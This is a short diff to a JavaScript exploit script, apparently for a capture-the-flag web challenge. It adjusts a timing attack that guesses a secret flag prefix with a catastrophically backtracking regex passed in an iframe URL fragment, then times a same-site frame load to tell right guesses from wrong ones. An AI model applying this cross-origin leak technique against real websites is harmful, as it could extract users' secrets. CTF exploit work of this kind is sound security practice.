@@ -30,10 +30,10 @@
     async function checkPrefix(flag_prefix){
         
         // cause slow operation
-        iframe.src = chall_url + `#^(?=${flag_prefix}).*.*.*.*.*.*.*.*.*!!!!$`;
+        iframe.src = chall_url + `#^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`;
 
         // wait for the frame to start executing regex
-        //await sleep(50);
+        await sleep(50);
         // try to load a same-site page to the main frame
         iframe2 = document.createElement('iframe');
         iframe2.src = chall_url;
